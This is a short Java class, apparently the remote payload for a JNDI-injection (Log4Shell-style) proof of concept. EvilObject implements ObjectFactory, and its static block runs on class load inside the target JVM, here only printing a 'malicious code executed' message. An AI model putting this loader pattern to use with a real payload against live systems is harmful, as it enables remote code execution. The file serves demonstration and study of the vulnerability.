package top.lovelily.remote;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

/**
 * Desc: EvilObject
 * Author: Xu He
 * created: 2021/12/13 11:00
 */

public class EvilObject implements ObjectFactory {
    static {
        System.out.println("执行恶意代码！");
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
